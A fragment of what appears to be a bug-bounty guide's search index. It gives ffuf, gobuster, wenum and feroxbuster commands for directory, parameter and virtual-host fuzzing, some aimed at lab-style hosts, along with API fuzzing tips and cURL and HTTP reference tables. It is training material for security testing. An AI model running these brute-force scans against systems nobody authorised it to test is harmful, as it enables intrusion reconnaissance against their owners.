<code>ffuf -u http://example.com/FUZZ -w wordlist.txt -e .php,.html</code> Add extensions <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -t 50</code> Set threads (50) <code>ffuf -u http://example.com/FUZZ -w wordlist.txt -x http://127.0.0.1:8080</code> Use proxy <code>ffuf -u http://94.237.53.81:52991/post.php -X POST -H \"Content-Type: application/x-www-form-urlencoded\" -d \"y=FUZZ\" -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -v</code> POST parameter fuzzing, match status code 200"},{"location":"bug-bounty-guide/web-fuzzing/#examples","title":"Examples","text":"Command Description <code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -u http://IP:PORT/FUZZ -t 80</code> Directory fuzzing, set to 80 threads <code>ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -ic -u http://IP:PORT/w2ksvrus/FUZZ -e .php,.html,.txt,.bak,.js -v -rate 500</code> File fuzzing, verbose output, limit to 500 request per second <code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic -v -u http://IP:PORT/FUZZ -e .php,.txt,.html -recursion -recursion-depth 2</code> Recursive fuzzing, limit depth to 2 <code>ffuf -u http://STMIP:STMPO/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -recursion -e .php,.txt,.html</code> Recursive directory fuzzing <code>ffuf -u http://STMIP:STMPO/admin/panel.php?accessID=FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -fw 8</code> Value fuzzing <code>ffuf -u http://fuzzing_fun.htb:STMPO -w /usr/share/seclists/Discovery/Web-Content/common.txt -H 'Host: FUZZ.fuzzing_fun.htb:STMPO' -ac</code> Vhost fuzzing"},{"location":"bug-bounty-guide/web-fuzzing/#gobuster","title":"Gobuster","text":"Flag Purpose <code>-u</code> Specifies the target URL or domain (e.g., <code>-u http://example.com</code>). <code>-w</code> Defines the wordlist file for brute-forcing (e.g., <code>-w /usr/share/wordlists/dirb/common.txt</code>). <code>-t</code> Sets the number of concurrent threads (e.g., <code>-t 50</code> for faster scanning). <code>-x</code> Specifies file extensions to test (e.g., <code>-x php,txt</code> for <code>.php</code> and <code>.txt</code>). <code>-k</code> Ignores SSL/TLS errors (e.g., <code>-k</code> for self-signed certificates). <code>-o</code> Outputs results to a file (e.g., <code>-o results.txt</code>). <code>-s</code> Filters by HTTP status codes (e.g., <code>-s 200,204</code> to show only 200 or 204 responses). <code>-e</code> Expands results to show full URLs (e.g., <code>-e</code> for detailed output). Command Description <code>gobuster dir -u http://example.com -w wordlist.txt</code> Directory fuzzing <code>gobuster dir -u http://example.com -w wordlist.txt -x .php,.html</code> Fuzz with extensions <code>gobuster dir -u http://example.com -w wordlist.txt -s 200</code> Filter by status code (only includes passed status code) <code>gobuster dir -u http://example.com -w wordlist.txt -b 200</code> Filter out status code (excludes passed status code) <code>gobuster dir -u http://example.com -w wordlist.txt --exclude-length 0,404</code> Filter out lengths (0 and 404 bytes filtered out) <code>gobuster dir -u http://example.com -w wordlist.txt -t 50</code> Set threads (50) <code>gobuster dir -u http://example.com -w wordlist.txt -o results.txt</code> Save output <code>gobuster dns -d example.com -w subdomains.txt</code> DNS subdomain fuzzing <code>gobuster dns -d example.com -w subdomains.txt -i</code> Show IPs for subdomains <code>gobuster dns -d example.com -w subdomains.txt -z</code> Silent mode"},{"location":"bug-bounty-guide/web-fuzzing/#examples_1","title":"Examples","text":"Command Description <code>gobuster vhost -u http://inlanefreight.htb:44915 -w /usr/share/seclists/Discovery/Web-Content/common.txt --append-domain</code> vhost fuzzing, <code>--append-domain</code> instructs Gobuster to append the base domain (inlanefreight.htb) to each word in the wordlist <code>gobuster dns -d inlanefreight.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</code> Subdomain fuzzing"},{"location":"bug-bounty-guide/web-fuzzing/#wenum","title":"Wenum","text":"Flag Description Example Scenario --hc (hide code) Exclude responses that match the specified status codes After fuzzing, the server returned many 400 Bad Request errors Use --hc 400 to hide them and focus on other responses --sc (show code) Include only responses that match the specified status codes You are only interested in successful requests (200 OK) Use --sc 200 to filter the results accordingly --hl (hide length) Exclude responses with the specified content length (in lines) The server returns verbose error messages with many lines Use --hl with a high value to hide these and focus on shorter responses --sl (show length) Include only responses with the specified content length (in lines) You suspect a specific response with a known line count is related to a vulnerability Use --sl to pinpoint it --hw (hide word) Exclude responses with the specified number of words The server includes common phrases in many responses Use --hw to filter out responses with those word counts --sw (show word) Include only responses with the specified number of words You are looking for short error messages Use --sw with a low value to find them --hs (hide size) Exclude responses with the specified response size (in bytes or characters) The server sends large files for valid requests Use --hs to filter out these large responses and focus on smaller ones --ss (show size) Include only responses with the specified response size (in bytes or characters) You are looking for a specific file size Use --ss to find it --hr (hide regex) Exclude responses whose body matches the specified regular expression Filter out responses containing the \"Internal Server Error\" message Use --hr \"Internal Server Error\" --sr (show regex) Include only responses whose body matches the specified regular expression Filter for responses containing the string \"admin\" using --sr \"admin\" --filter/--hard-filter General-purpose filter to show/hide responses or prevent their post-processing using a regular expression --filter \"Login\" will show only responses containing \"Login\", while --hard-filter \"Login\" will hide them and prevent any plugins from processing them Command Description <code>wenum -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404 -u \"http://94.237.53.81:52991/get.php?x=FUZZ\"</code> Parameter fuzzing, exclude 404 <code>wenum -c -z file,wordlist.txt -d 'username=FUZZ&amp;password=secret'</code> Fuzz POST data <code>wenum -c -z file,wordlist.txt -b 'session=12345'</code> Use cookie <code>wenum -c -z file,wordlist.txt -H 'User-Agent: Wenum'</code> Add custom header <code>wenum -c -z file,wordlist.txt -t 50</code> Set threads (50) <code>wenum -c -z file,wordlist.txt -u http://example.com/FUZZ -X PUT</code> Fuzz with PUT method <code>wenum -c -z file,wordlist.txt --hl 50</code> Filter by content length"},{"location":"bug-bounty-guide/web-fuzzing/#feroxbuster","title":"Feroxbuster","text":"Flag Description Example Scenario --dont-scan (Request) Exclude specific URLs or patterns from being scanned (even if found in links during recursion) You know the /uploads directory contains only images, so you can exclude it using --dont-scan /uploads -S, --filter-size Exclude responses based on their size (in bytes) You can specify single sizes or comma-separated ranges You've noticed many 1KB error pages Use -S 1024 to exclude them -X, --filter-regex Exclude responses whose body or headers match the specified regular expression Filter out pages with a specific error message using -X \"Access Denied\" -W, --filter-words Exclude responses with a specific word count or range of word counts Eliminate responses with very few words (e.g., error messages) using -W 0-10 -N, --filter-lines Exclude responses with a specific line count or range of line counts Filter out long, verbose pages with -N 50- -C, --filter-status Exclude responses based on specific HTTP status codes This operates as a denylist Suppress common error codes like 404 and 500 using -C 404,500 --filter-similar-to Exclude responses that are similar to a given webpage Remove duplicate or near-duplicate pages based on a reference page using --filter-similar-to error.html -s, --status-codes Include only responses with the specified status codes This operates as an allowlist (default: all) Focus on successful responses using -s 200,204,301,302 Command Description <code>feroxbuster -u http://example.com -w wordlist.txt</code> Basic URL fuzzing <code>feroxbuster -u http://example.com -w wordlist.txt -e</code> Include extensions <code>feroxbuster -u http://example.com -w wordlist.txt -x 404</code> Exclude 404 responses <code>feroxbuster -u http://example.com -w wordlist.txt -t 50</code> Set threads (50) <code>feroxbuster -u http://example.com -w wordlist.txt --depth 3</code> Set recursion depth (3) <code>feroxbuster -u http://example.com -w wordlist.txt -o results.txt</code> Save output <code>feroxbuster -u http://example.com -w wordlist.txt --no-recursion</code> Disable recursion <code>feroxbuster -u http://example.com -w wordlist.txt --url-redirect</code> Follow redirects"},{"location":"bug-bounty-guide/web-fuzzing/#web-api-types","title":"Web API Types","text":"Type Description Features REST Uses HTTP methods for resources JSON/XML, stateless, scalable, caching SOAP XML-based protocol for services XML, stateful/stateless, WS-Security GraphQL Query language for APIs JSON, single endpoint, flexible queries"},{"location":"bug-bounty-guide/web-fuzzing/#rest-fuzzing-tips","title":"REST Fuzzing Tips","text":"Tip Explanation Test All Methods Check GET, POST, PUT, DELETE for vulns Validate Input Fields Fuzz inputs with unexpected data Examine Errors Analyze messages for info disclosure Test Authentication Check for weak auth controls Explore Rate Limits Test throttling for bypasses Use Comprehensive Payloads Test SQLi, XSS payloads Check Representations Test JSON/XML for consistency flaws"},{"location":"bug-bounty-guide/web-fuzzing/#soap-fuzzing-tips","title":"SOAP Fuzzing Tips","text":"Tip Explanation Analyze WSDL Files Understand service operations Validate XML Schema Test for validation flaws Check XML Injection Fuzz for injection vulnerabilities Test SOAP Headers Identify header misconfigurations Evaluate WS-Security Verify security implementations Test Transport Security Ensure HTTPS enforcement Examine SOAP Faults Check for info leakage in faults"},{"location":"bug-bounty-guide/web-fuzzing/#graphql-fuzzing-tips","title":"GraphQL Fuzzing Tips","text":"Tip Explanation Test Query Depth Check handling of complex queries Validate Input Types Fuzz arguments for validation flaws Examine Query Aliasing Test aliased queries for leakage Check Introspection Ensure no sensitive schema exposure Assess Authorization Verify query access controls Evaluate Rate Limiting Test handling of excessive queries Fuzz Mutations Test data-altering queries for flaws"},{"location":"bug-bounty-guide/web-requests/","title":"Web Requests","text":""},{"location":"bug-bounty-guide/web-requests/#http-response-codes","title":"HTTP Response Codes","text":""},{"location":"bug-bounty-guide/web-requests/#classes","title":"Classes","text":"Class Description 1xx Provides information, does not affect request processing 2xx Indicates a successful request 3xx Indicates server redirection of the client 4xx Signifies improper client requests (e.g., nonexistent resource or bad format) 5xx Indicates an issue with the HTTP server"},{"location":"bug-bounty-guide/web-requests/#specific-codes","title":"Specific Codes","text":"Code Name Description 100 Continue Request can continue 200 OK Request successful 201 Created Resource created 204 No Content Request successful, no content 301 Moved Permanently Resource moved permanently 302 Found Resource temporarily moved 400 Bad Request Invalid request 401 Unauthorized Authentication required 403 Forbidden Access denied 404 Not Found Resource not found 405 Method Not Allowed Known by the server but has been disabled and cannot be used 408 Request Timeout Sent on an idle connection by some servers, even without any previous request by the client 500 Internal Server Error Server error 502 Bad Gateway Invalid gateway response 503 Service Unavailable Server temporarily unavailable 504 Gateway Timeout The server is acting as a gateway and cannot get a response in time"},{"location":"bug-bounty-guide/web-requests/#http-headers","title":"HTTP Headers","text":"<p>Complete list of standard headers</p>"},{"location":"bug-bounty-guide/web-requests/#request-headers","title":"Request Headers","text":"<p>Contain more information about the resource to be fetched, or about the client requesting the resource.</p> Header Example Description Accept <code>text/html,application/xhtml+xml</code> Media types acceptable for the response Authorization <code>Bearer eyJhbGciOiJIUzI1NiJ9...</code> Credentials for authentication User-Agent <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64)</code> Client software details Host <code>developer.mozilla.org</code> Domain name of the server Referer <code>https://example.com/page</code> URL of the page that initiated the request Cookie <code>sessionId=abc123; user=john</code> Cookies previously set by the server, sent with the request <p>Full list of request headers</p>"},{"location":"bug-bounty-guide/web-requests/#response-headers","title":"Response Headers","text":"<p>Hold additional information about the response, like its location or about the server providing it.</p> Header Example Description Location <code>https://developer.mozilla.org/</code> URL for redirection Server <code>Apache/2.4.41 (Unix)</code> Server software information Allow <code>GET, POST, HEAD</code> Allowed HTTP methods Date <code>Tue, 09 Sep 2025 09:09:00 GMT</code> Date and time of the response Set-Cookie <code>sessionId=abc123; Path=/; HttpOnly</code> Defines a cookie to be stored by the client WWW-Authenticate Authentication method and realm for access <p>Full list of response headers</p>"},{"location":"bug-bounty-guide/web-requests/#security-headers","title":"Security Headers","text":"<p>Response headers that enforce browser security policies to protect websites from attacks.</p> Header Example Description Content-Security-Policy <code>script-src 'self'</code> Sets rules for allowed resource sources, preventing XSS by restricting scripts to trusted domains. Strict-Transport-Security <code>max-age=31536000</code> Forces HTTPS connections, blocking plaintext HTTP to prevent traffic sniffing. Referrer-Policy <code>origin</code> Controls <code>Referer</code> header, limiting sensitive URL exposure during navigation. <p>OWASP secure response headers</p>"},{"location":"bug-bounty-guide/web-requests/#representationentity-headers","title":"Representation/Entity Headers","text":"<p>Contain information about the body of the resource, like its MIME type, or encoding/compression applied. Common to both request and response.</p> Header Example Description Content-Type <code>text/html; charset=UTF-8</code> MIME type and character encoding of the body Content-Encoding <code>gzip</code> Compression method applied to the body Content-Language <code>en-US</code> Language of the resource content Content-Location <code>/documents/foo.json</code> Alternate location for the returned data Boundary <code>----WebKitFormBoundary7MA4YWxkTrZu0gW</code> Delimiter for separating parts in multipart messages, e.g., form data or file uploads Media-Type <code>multipart/form-data</code> Specifies the MIME type of the message body, often used with multipart data"},{"location":"bug-bounty-guide/web-requests/#payload-headers","title":"Payload Headers","text":"<p>Contain representation-independent information about payload data, including content length and the encoding used for transport.</p> Header Example Description Content-Length <code>348</code> Size of the response body in bytes Transfer-Encoding <code>chunked</code> Encoding used for data transfer Trailer <code>Expires</code> Headers sent after the chunked response"},{"location":"bug-bounty-guide/web-requests/#http-request-methods","title":"HTTP Request Methods","text":"Method Description GET Requests a resource POST Submits data to create/update a resource PUT Updates a resource with provided data DELETE Removes a specified resource HEAD Requests headers only, no body OPTIONS Lists allowed methods for a resource PATCH Partially updates a resource TRACE Echoes the received request for debugging"},{"location":"bug-bounty-guide/web-requests/#curl","title":"cURL","text":"Command Description <code>curl -h</code> cURL help menu <code>curl inlanefreight.com</code> Basic GET request <code>curl -s -O inlanefreight.com/index.html</code> Download file <code>curl -k https://inlanefreight.com</code> Skip HTTPS (SSL) certificate validation <code>curl inlanefreight.com -v</code> Print full HTTP request/response details <code>curl -I https://www.inlanefreight.com</code> Send HEAD request (only prints response headers) <code>curl -i https://www.inlanefreight.com</code> Print response headers and response body <code>curl https://www.inlanefreight.com -A 'Mozilla/5.0'</code> Set User-Agent header <code>curl -u admin:admin http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set HTTP basic authorization credentials <code>curl http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Pass HTTP basic authorization credentials in the URL <code>curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request header <code>curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php?search=le'</code> Pass GET parameters <code>curl -X POST -d 'username=admin&amp;password=admin' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Send POST request with POST data <code>curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code> Set request cookies <code>curl -X POST -d '{\"search\":\"london\"}' -H 'Content-Type: application/json' http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code> Send POST request with JSON data"},{"location":"bug-bounty-guide/web-requests/#apis","title":"APIs","text":"Command Description <code>curl http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london</code> Read entry <code>curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ | jq</code> Read all entries <code>curl -X POST http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/ -d '{\"city_name\":\"HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Create (add) entry <code>curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d '{\"city_name\":\"New_HTB_City\", \"country_name\":\"HTB\"}' -H 'Content-Type: application/json'</code> Update (modify) entry <code>curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City</code> Delete entry"},{"location":"bug-bounty-guide/web-requests/#browser-devtools","title":"Browser DevTools","text":"Shortcut Description <code>[CTRL+SHIFT+I]</code> or <code>[F12]</code> Show devtools <code>[CTRL+SHIFT+E]</code> Show Network tab <code>[CTRL+SHIFT+K]</code> Show Console tab <p>Tip: Use the network tab to observe dynamic content in action</p>"},{"location":"bug-bounty-guide/web-service-and-api-attacks/","title":"Web Service &amp; API Attacks","text":""}]}